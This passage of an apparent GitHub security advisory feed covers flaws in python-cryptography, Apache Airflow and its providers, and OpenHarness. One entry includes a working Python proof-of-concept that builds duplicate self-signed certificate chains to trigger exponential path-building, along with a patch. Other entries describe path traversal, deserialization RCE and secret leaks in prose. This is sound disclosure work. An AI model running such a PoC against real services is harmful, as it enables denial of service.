<li>PR <code>#43606</code>: <code>https://github.com/vllm-project/vllm/pull/43606</code></li>
<li>PR <code>#44285</code>: <code>https://github.com/vllm-project/vllm/pull/44285</code></li>
<li><code>GHSA-3mwp-wvh9-7528</code>: <code>https://github.com/vllm-project/vllm/security/advisories/GHSA-3mwp-wvh9-7528</code></li>
<li>PR <code>#45390</code>: <code>https://github.com/vllm-project/vllm/pull/45390</code></li>
<li>Release <code>v0.23.0</code>: <code>https://github.com/vllm-project/vllm/releases/tag/v0.23.0</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-8737-qx52-hjff">https://github.com/vllm-project/vllm/security/advisories/GHSA-8737-qx52-hjff</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71486">https://nvd.nist.gov/vuln/detail/CVE-2026-71486</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/47260">https://github.com/vllm-project/vllm/pull/47260</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/8e61b646e2d157f9b93451fa048f9c8530c8a67b">https://github.com/vllm-project/vllm/commit/8e61b646e2d157f9b93451fa048f9c8530c8a67b</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8737-qx52-hjff">https://github.com/advisories/GHSA-8737-qx52-hjff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8737-qx52-hjff</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-04T21:32:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cryptography] python-cryptography: Duplicate self-signed intermediates can cause exponential path-building]]></title>
        <id>https://github.com/advisories/GHSA-jwv3-5hgf-82ww</id>
        <link href="https://github.com/advisories/GHSA-jwv3-5hgf-82ww"/>
        <updated>2026-09-04T21:19:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack.</p>
<p>This work was completed by Trail of Bits as part of the Patch The Planet project in collaboration with OpenAI. The finding was identified primarily by the Codex coding agent, and manually reviewed before submission. </p>
<h3 id="details">Details</h3>
<p>The core issue arises in the recursive nature of <code>build_chain_inner</code>, which does not de-duplicate against previously analyzed candidates.</p>
<pre><code class="language-python">    fn build_chain_inner(
        &amp;self,
        working_cert: &amp;VerificationCertificate&lt;'chain, B&gt;,
        current_depth: u8,
        working_cert_extensions: &amp;Extensions&lt;'chain&gt;,
        name_chain: NameChain&lt;'_, 'chain&gt;,
        budget: &amp;mut Budget,
    ) -&gt; ValidationResult&lt;'chain, Chain&lt;'chain, B&gt;, B&gt; {
        if let Some(nc) = working_cert_extensions.get_extension(&amp;NAME_CONSTRAINTS_OID) {
            name_chain.evaluate_constraints(&amp;nc.value()?, budget)?;
        }

        // Look in the store's root set to see if the working cert is listed.
        // If it is, we've reached the end.
        if self.store.contains(working_cert) {
            return Ok(vec![working_cert.clone()]);
        }

        // Check that our current depth does not exceed our policy-configured
        // max depth. We do this after the root set check, since the depth
        // only measures the intermediate chain's length, not the root or leaf.
        if current_depth &gt; self.policy.max_chain_depth {
            return Err(ValidationError::new(ValidationErrorKind::Other(
                "chain construction exceeds max depth".into(),
            )));
        }

        // Otherwise, we collect a list of potential issuers for this cert,
        // and continue with the first that verifies.
        let mut last_err: Option&lt;ValidationError&lt;'_, B&gt;&gt; = None;
        for issuing_cert_candidate in self.potential_issuers(working_cert) {
            // A candidate issuer is said to verify if it both
            // signs for the working certificate and conforms to the
            // policy.
            let issuer_extensions = issuing_cert_candidate.certificate().extensions()?;
            match self.policy.valid_issuer(
                issuing_cert_candidate,
                working_cert,
                current_depth,
                &amp;issuer_extensions,
            ) {
                Ok(_) =&gt; {
                    match self.build_chain_inner(
</code></pre>
<p>A sufficient patch is to track valid issuers, and to skip seen ones before recursing. By tracking valid issuers only, validation and custom extension-policy callbacks still run.</p>
<pre><code class="language-rust">          let mut seen_valid_issuers = Vec::&lt;&amp;VerificationCertificate&lt;'chain, B&gt;&gt;::new();
          for issuing_cert_candidate in self.potential_issuers(working_cert) {
          . . .
                  Ok(_) =&gt; {
                      if seen_valid_issuers.contains(&amp;issuing_cert_candidate) {
                         continue;
                      }
                      seen_valid_issuers.push(issuing_cert_candidate);
 
                      match self.build_chain_inner(
                          issuing_cert_candidate,
                          // NOTE(ww): According to RFC 5280, we should only
</code></pre>
<p>In testing, this fix removed the exponential blowup without breaking apparent correctness. </p>
<pre><code>duplicates,max_depth,result,seconds
1,7,rejected,0.000464 -&gt; 1,7,rejected,0.000667
2,7,rejected,0.025154 -&gt; 2,7,rejected,0.001229
3,7,rejected,0.489924 -&gt; 3,7,rejected,0.001619 
4,7,rejected,4.309403 -&gt; 4,7,rejected,0.002144
3,8,rejected,1.468193 -&gt; 3,8,rejected,0.001811
4,8,timeout&gt;5s,       -&gt; 4,8,rejected,0.002410
5,7,timeout&gt;5s,       -&gt; 5,7,rejected,0.002640
6,6,timeout&gt;5s,       -&gt; 6,6,rejected,0.002829
</code></pre>
<h3 id="poc">PoC</h3>
<p>The following script benchmarks processing times for malicious cert chains.</p>
<pre><code class="language-python">import datetime
import multiprocessing
import time

import cryptography
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
from cryptography.x509.verification import (
    DNSName,
    PolicyBuilder,
    Store,
    VerificationError,
)

NOW = datetime.datetime(2024, 1, 1, tzinfo=datetime.timezone.utc)
TIMEOUT = 5
CA_KEY_USAGE = x509.KeyUsage(
    digital_signature=True,
    content_commitment=False,
    key_encipherment=False,
    data_encipherment=False,
    key_agreement=False,
    key_cert_sign=True,
    crl_sign=True,
    encipher_only=False,
    decipher_only=False,
)
EE_KEY_USAGE = x509.KeyUsage(
    digital_signature=True,
    content_commitment=False,
    key_encipherment=False,
    data_encipherment=False,
    key_agreement=False,
    key_cert_sign=False,
    crl_sign=False,
    encipher_only=False,
    decipher_only=False,
)

def name(common_name):
    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])

def base_builder(subject, issuer, public_key, serial):
    return (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(public_key)
        .serial_number(serial)
        .not_valid_before(NOW - datetime.timedelta(days=1))
        .not_valid_after(NOW + datetime.timedelta(days=30))
    )

def make_ca(common_name, serial):
    private_key = ec.generate_private_key(ec.SECP256R1())
    subject = name(common_name)
    cert = (
        base_builder(subject, subject, private_key.public_key(), serial)
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
        .add_extension(CA_KEY_USAGE, True)
        .add_extension(
            x509.SubjectKeyIdentifier.from_public_key(private_key.public_key()),
            False,
        )
        .sign(private_key, hashes.SHA256())
    )
    return private_key, cert

def make_leaf(issuer_key, issuer_cert):
    private_key = ec.generate_private_key(ec.SECP256R1())
    return (
        base_builder(name("leaf"), issuer_cert.subject, private_key.public_key(), 100)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), True)
        .add_extension(EE_KEY_USAGE, True)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("example.com")]), False)
        .add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(issuer_key.public_key()),
            False,
        )
        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), False)
        .sign(issuer_key, hashes.SHA256())
    )

def build_material():
    looping_key, looping_ca = make_ca("looping self-signed CA", 1)
    _, unrelated_root = make_ca("unrelated trust anchor", 2)
    leaf = make_leaf(looping_key, looping_ca)
    return leaf, looping_ca, unrelated_root

def verify_case(duplicates, max_depth, queue):
    leaf, looping_ca, unrelated_root = build_material()
    verifier = (
        PolicyBuilder()
        .store(Store([unrelated_root]))
        .time(NOW)
        .max_chain_depth(max_depth)
        .build_server_verifier(DNSName("example.com"))
    )

    start = time.perf_counter()
    try:
        verifier.verify(leaf, [looping_ca] * duplicates)
        result = "accepted"
    except VerificationError:
        result = "rejected"
    queue.put((result, time.perf_counter() - start))

def run_case(duplicates, max_depth):
    queue = multiprocessing.Queue()
    process = multiprocessing.Process(
        target=verify_case,
        args=(duplicates, max_depth, queue),
    )
    process.start()
    process.join(TIMEOUT)

    if process.is_alive():
        process.terminate()
        process.join()
        print(f"{duplicates},{max_depth},timeout&gt;{TIMEOUT}s,")
        return

    result, elapsed = queue.get()
    print(f"{duplicates},{max_depth},{result},{elapsed:.6f}")

if __name__ == "__main__":
    print("duplicates,max_depth,result,seconds")
    for case in [(1, 7), (2, 7), (3, 7), (4, 7), (3, 8), (4, 8), (5, 7), (6, 6)]:
        run_case(*case)
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue exposes an amplification pathway over data that in many applications may be user-controlled, leading to the possibility of a denial of service through resource exhaustion. As the correctness of validation is not affected, the integrity of a system cannot be compromised through this vector, only its availability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww">https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww</a></li>
<li><a href="https://github.com/pyca/cryptography/pull/14960">https://github.com/pyca/cryptography/pull/14960</a></li>
<li><a href="https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582">https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-69249">https://nvd.nist.gov/vuln/detail/CVE-2026-69249</a></li>
<li><a href="https://github.com/pyca/cryptography/commit/3763aa79b">https://github.com/pyca/cryptography/commit/3763aa79b</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2026-3553.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2026-3553.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-jwv3-5hgf-82ww">https://github.com/advisories/GHSA-jwv3-5hgf-82ww</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jwv3-5hgf-82ww</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T21:26:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow exposes deferred trigger kwargs in task-instance API responses]]></title>
        <id>https://github.com/advisories/GHSA-22hf-vx2v-gjff</id>
        <link href="https://github.com/advisories/GHSA-22hf-vx2v-gjff"/>
        <updated>2026-09-04T19:28:50.000Z</updated>
        <content type="html"><![CDATA[<p>In Apache Airflow before 3.3.0, the REST API task-instance detail and list endpoints returned a deferred task's trigger kwargs without masking. When a deferred operator passed a secret (for example a provider API key) into its trigger, any authenticated user with DAG-scoped task-instance read access for that DAG could read that secret in clear text while the task was deferred.
Users should upgrade to apache-airflow 3.3.0 or later, which masks sensitive values in trigger kwargs returned by the API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49487">https://nvd.nist.gov/vuln/detail/CVE-2026-49487</a></li>
<li><a href="https://github.com/apache/airflow/pull/67868">https://github.com/apache/airflow/pull/67868</a></li>
<li><a href="https://lists.apache.org/thread/qlw6pozlzlfhkvmbgqsbjlq6vj4v0pc4">https://lists.apache.org/thread/qlw6pozlzlfhkvmbgqsbjlq6vj4v0pc4</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/07/07/6">http://www.openwall.com/lists/oss-security/2026/07/07/6</a></li>
<li><a href="https://github.com/apache/airflow/commit/9101aa66754af052ba5010a5fce9f8fa4140e6c7">https://github.com/apache/airflow/commit/9101aa66754af052ba5010a5fce9f8fa4140e6c7</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2088.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2088.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-22hf-vx2v-gjff">https://github.com/advisories/GHSA-22hf-vx2v-gjff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22hf-vx2v-gjff</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-07T12:31:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow exposes sensitive JSON Variable values through the Bulk Variables API]]></title>
        <id>https://github.com/advisories/GHSA-563f-2439-rmq4</id>
        <link href="https://github.com/advisories/GHSA-563f-2439-rmq4"/>
        <updated>2026-09-04T19:25:32.000Z</updated>
        <content type="html"><![CDATA[<p>The Bulk Variables API in Apache Airflow called the redactor without passing the variable's key, so the key-based <code>should_hide_value_for_key</code> check (which triggers on secret-suffixed key names like <code>*_password</code> / <code>*_token</code> / <code>*_secret</code>) could not fire for JSON-decodable variable values. An authenticated UI/API user with bulk Variable read permission could retrieve plaintext values from JSON variables whose key would otherwise trigger redaction. Affects deployments that store sensitive values in JSON-typed Airflow Variables under secret-suffixed key names. Users are advised to upgrade to <code>apache-airflow</code> 3.3.0 or later (the fix landed on <code>main</code> after 3.2.2; no 3.2.x backport).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48828">https://nvd.nist.gov/vuln/detail/CVE-2026-48828</a></li>
<li><a href="https://github.com/apache/airflow/pull/67495">https://github.com/apache/airflow/pull/67495</a></li>
<li><a href="https://lists.apache.org/thread/y9kf314t6dhnv994hr11wj3tbow847yc">https://lists.apache.org/thread/y9kf314t6dhnv994hr11wj3tbow847yc</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/07/07/2">http://www.openwall.com/lists/oss-security/2026/07/07/2</a></li>
<li><a href="https://github.com/apache/airflow/commit/b12f5ad66f51b91fd0a6268f94938be830133115">https://github.com/apache/airflow/commit/b12f5ad66f51b91fd0a6268f94938be830133115</a></li>
<li><a href="https://github.com/advisories/GHSA-563f-2439-rmq4">https://github.com/advisories/GHSA-563f-2439-rmq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-563f-2439-rmq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-07T12:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow exposes secrets backend credentials through the Config API]]></title>
        <id>https://github.com/advisories/GHSA-9933-5rrp-mfwx</id>
        <link href="https://github.com/advisories/GHSA-9933-5rrp-mfwx"/>
        <updated>2026-09-04T19:24:55.000Z</updated>
        <content type="html"><![CDATA[<p>The Config API in Apache Airflow surfaced per-key secrets-backend overrides (environment variables like <code>AIRFLOW__SECRETS__BACKEND_KWARG__SECRET_ID</code> and <code>AIRFLOW__WORKERS__SECRETS_BACKEND_KWARG__SECRET_ID</code>) as synthetic config options whose option names were not in <code>sensitive_config_values</code>, so the masker did not redact them. An authenticated UI/API user with Config read permission could retrieve plaintext secrets-backend credentials (Vault <code>role_id</code> / <code>secret_id</code>, etc.) from the Config API output. Affects deployments that configure secrets backends via per-key environment overrides. Users are advised to upgrade to <code>apache-airflow</code> 3.3.0 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48892">https://nvd.nist.gov/vuln/detail/CVE-2026-48892</a></li>
<li><a href="https://github.com/apache/airflow/pull/67622">https://github.com/apache/airflow/pull/67622</a></li>
<li><a href="https://lists.apache.org/thread/pq5yy40079h6tzh3fxvw28dd8dbk72hk">https://lists.apache.org/thread/pq5yy40079h6tzh3fxvw28dd8dbk72hk</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/07/07/4">http://www.openwall.com/lists/oss-security/2026/07/07/4</a></li>
<li><a href="https://github.com/apache/airflow/commit/f0f978d2736891a2f9e9d2954e87fc358e1ef4e3">https://github.com/apache/airflow/commit/f0f978d2736891a2f9e9d2954e87fc358e1ef4e3</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2087.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2087.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-9933-5rrp-mfwx">https://github.com/advisories/GHSA-9933-5rrp-mfwx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9933-5rrp-mfwx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-07T12:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow exposes unreadable DAG identifiers in the scheduling dependencies graph]]></title>
        <id>https://github.com/advisories/GHSA-3322-mjxh-9mp5</id>
        <link href="https://github.com/advisories/GHSA-3322-mjxh-9mp5"/>
        <updated>2026-09-04T19:24:10.000Z</updated>
        <content type="html"><![CDATA[<p>A bug in Apache Airflow's <code>/ui/dependencies</code> scheduling graph endpoint applied the caller's readable-Dag filter to the top-level serialized Dag key but still emitted referenced Dag IDs through the <code>dep.source</code> and <code>dep.target</code> fields of trigger / sensor dependency entries. An authenticated UI user with read permission on some Dags could enumerate the identifiers of other Dags they were not authorized to read by inspecting the dependency graph for trigger / sensor references. Affects deployments that rely on per-Dag read scoping to keep Dag identifiers private across teams. This is a residual gap in the fix for CVE-2026-28563, which filtered the top-level Dag key but did not propagate the filter into the trigger / sensor dep-source / dep-target fields. Users who already upgraded for CVE-2026-28563 should additionally upgrade to <code>apache-airflow</code> 3.3.0 or later to cover the residual trigger / sensor dependency leak.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48891">https://nvd.nist.gov/vuln/detail/CVE-2026-48891</a></li>
<li><a href="https://github.com/apache/airflow/pull/67627">https://github.com/apache/airflow/pull/67627</a></li>
<li><a href="https://lists.apache.org/thread/wzc8nflg94rq6w8f5tvtlo0o3g4wjrfl">https://lists.apache.org/thread/wzc8nflg94rq6w8f5tvtlo0o3g4wjrfl</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2026-28563">https://www.cve.org/CVERecord?id=CVE-2026-28563</a></li>
<li><a href="https://github.com/apache/airflow/commit/e61c9bac30a7b1a7f68589629f10c4cb247c683e">https://github.com/apache/airflow/commit/e61c9bac30a7b1a7f68589629f10c4cb247c683e</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2086.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2086.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-3322-mjxh-9mp5">https://github.com/advisories/GHSA-3322-mjxh-9mp5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3322-mjxh-9mp5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-07T12:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow allows code execution through unsafe serialized DAG deserialization]]></title>
        <id>https://github.com/advisories/GHSA-2943-9672-r45w</id>
        <link href="https://github.com/advisories/GHSA-2943-9672-r45w"/>
        <updated>2026-09-04T19:23:04.000Z</updated>
        <content type="html"><![CDATA[<p>A bug in <code>BaseSerialization.deserialize()</code> allowed unrestricted <code>import_string()</code> of attacker-controlled class paths when the Scheduler / API Server loaded a serialized DAG: a DAG author could embed a malicious trigger into a DAG to gain remote code execution on the API Server / Scheduler process, crossing the Airflow security boundary that DAG-author code must never execute in those processes. Users are advised to upgrade to <code>apache-airflow</code> 3.3.0 or later. As a defense-in-depth mitigation, deployments where DAG-author trust is limited can restrict the <code>[core] allowed_deserialization_classes</code> config to a narrow allowlist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33264">https://nvd.nist.gov/vuln/detail/CVE-2026-33264</a></li>
<li><a href="https://github.com/apache/airflow/pull/66002">https://github.com/apache/airflow/pull/66002</a></li>
<li><a href="https://github.com/apache/airflow/pull/68528">https://github.com/apache/airflow/pull/68528</a></li>
<li><a href="https://lists.apache.org/thread/otvdw8qt2y7xy2n5nq9xby9ky4rf5ltj">https://lists.apache.org/thread/otvdw8qt2y7xy2n5nq9xby9ky4rf5ltj</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/07/07/1">http://www.openwall.com/lists/oss-security/2026/07/07/1</a></li>
<li><a href="https://github.com/apache/airflow/commit/69b6c54ef17b048ebb0e9a656d0d9e1c99480d6b">https://github.com/apache/airflow/commit/69b6c54ef17b048ebb0e9a656d0d9e1c99480d6b</a></li>
<li><a href="https://github.com/apache/airflow/commit/7e9bdb245e09373d91fcb7bda575ad4be63aa28d">https://github.com/apache/airflow/commit/7e9bdb245e09373d91fcb7bda575ad4be63aa28d</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2082.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2082.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-2943-9672-r45w">https://github.com/advisories/GHSA-2943-9672-r45w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2943-9672-r45w</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-07T12:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-google] Apache Airflow Google provider allows path traversal through GCS object names]]></title>
        <id>https://github.com/advisories/GHSA-v3mh-27qj-w836</id>
        <link href="https://github.com/advisories/GHSA-v3mh-27qj-w836"/>
        <updated>2026-09-04T19:22:14.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow's Google provider operators <code>GCSToSFTPOperator</code> and <code>GCSTimeSpanFileTransformOperator</code> joined GCS object names returned by the bucket listing API directly to a destination filesystem path without normalisation or containment check. A user with write access to the source GCS bucket (typically a different trust principal than the DAG author — partner uploads, ingest-only service accounts, public-data buckets) could create an object whose name contains <code>..</code> segments and cause the DAG run to write the downloaded blob outside the configured destination (the SFTP <code>destination_path</code> for <code>GCSToSFTPOperator</code>; the worker-local temp directory for <code>GCSTimeSpanFileTransformOperator</code>), enabling overwrite of arbitrary files on the SFTP server or the worker host. Affects deployments that ingest from buckets writable by less-trusted principals. Users are advised to upgrade to <code>apache-airflow-providers-google</code> 22.2.1 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49297">https://nvd.nist.gov/vuln/detail/CVE-2026-49297</a></li>
<li><a href="https://github.com/apache/airflow/pull/67667">https://github.com/apache/airflow/pull/67667</a></li>
<li><a href="https://lists.apache.org/thread/cb5nvoxsj1q7rv878cyqgtg150w0zglq?users@airflow.apache.org">https://lists.apache.org/thread/cb5nvoxsj1q7rv878cyqgtg150w0zglq?users@airflow.apache.org</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/07/04/8">http://www.openwall.com/lists/oss-security/2026/07/04/8</a></li>
<li><a href="https://github.com/apache/airflow/commit/0385bae70553223677753047b3e779d8b86b15c4">https://github.com/apache/airflow/commit/0385bae70553223677753047b3e779d8b86b15c4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-google/PYSEC-2026-2084.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-google/PYSEC-2026-2084.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-v3mh-27qj-w836">https://github.com/advisories/GHSA-v3mh-27qj-w836</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3mh-27qj-w836</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-06T12:31:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-ftp] Apache Airflow FTP provider: FTP Provider does not protect FTPS data channel (missing PROT_P)]]></title>
        <id>https://github.com/advisories/GHSA-fgch-86x8-fv43</id>
        <link href="https://github.com/advisories/GHSA-fgch-86x8-fv43"/>
        <updated>2026-09-04T18:48:05.000Z</updated>
        <content type="html"><![CDATA[<p>The Apache Airflow FTP provider's <code>FTPSHook.get_conn()</code> created an <code>ftplib.FTP_TLS</code> connection but never called <code>prot_p()</code>, so although the control channel was TLS-protected the data channel was transmitted in cleartext. Any deployment using <code>FTPSHook</code> or <code>FTPSFileTransmitOperator</code> to move files over FTPS exposed file contents and credentials-in-transit to a network attacker able to observe the data connection. Upgrade apache-airflow-providers-ftp to <code>3.15.1</code> or later, which issues <code>PROT P</code> to encrypt the data channel.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49486">https://nvd.nist.gov/vuln/detail/CVE-2026-49486</a></li>
<li><a href="https://github.com/apache/airflow/pull/67946">https://github.com/apache/airflow/pull/67946</a></li>
<li><a href="https://lists.apache.org/thread/gwnsxlt9hfj5pc543wxtogbnjdn04xj1">https://lists.apache.org/thread/gwnsxlt9hfj5pc543wxtogbnjdn04xj1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/26/1">http://www.openwall.com/lists/oss-security/2026/06/26/1</a></li>
<li><a href="https://github.com/apache/airflow/commit/a929d142d667f71dea29c565a7167216a9c30378">https://github.com/apache/airflow/commit/a929d142d667f71dea29c565a7167216a9c30378</a></li>
<li><a href="https://github.com/apache/airflow/releases/tag/providers-ftp/3.15.1">https://github.com/apache/airflow/releases/tag/providers-ftp/3.15.1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-ftp/PYSEC-2026-238.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-ftp/PYSEC-2026-238.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-fgch-86x8-fv43">https://github.com/advisories/GHSA-fgch-86x8-fv43</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fgch-86x8-fv43</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T09:30:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openharness-ai] OpenHarness remote resume commands expose other users' saved session snapshots]]></title>
        <id>https://github.com/advisories/GHSA-399c-3gm2-p29v</id>
        <link href="https://github.com/advisories/GHSA-399c-3gm2-p29v"/>
        <updated>2026-09-04T17:45:37.000Z</updated>
        <content type="html"><![CDATA[<p>OpenHarness ohmo gateway /resume and /summary slash commands default remote_invocable to True, allowing admitted remote senders to enumerate and load arbitrary session snapshots by ID. Attackers can exploit this to access victim snapshots containing private prompts, credentials, tool output, and file paths via shared gateway channels.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56695">https://nvd.nist.gov/vuln/detail/CVE-2026-56695</a></li>
<li><a href="https://github.com/HKUDS/OpenHarness/pull/276">https://github.com/HKUDS/OpenHarness/pull/276</a></li>
<li><a href="https://github.com/HKUDS/OpenHarness/commit/92e298852c9b9c8c2266236292073623418c640a">https://github.com/HKUDS/OpenHarness/commit/92e298852c9b9c8c2266236292073623418c640a</a></li>
<li><a href="https://www.vulncheck.com/advisories/openharness-cross-session-disclosure-via-resume-and-summary-commands">https://www.vulncheck.com/advisories/openharness-cross-session-disclosure-via-resume-and-summary-commands</a></li>
<li><a href="https://github.com/advisories/GHSA-399c-3gm2-p29v">https://github.com/advisories/GHSA-399c-3gm2-p29v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-399c-3gm2-p29v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-23T18:31:40.000Z</published>
    </entry>
</feed>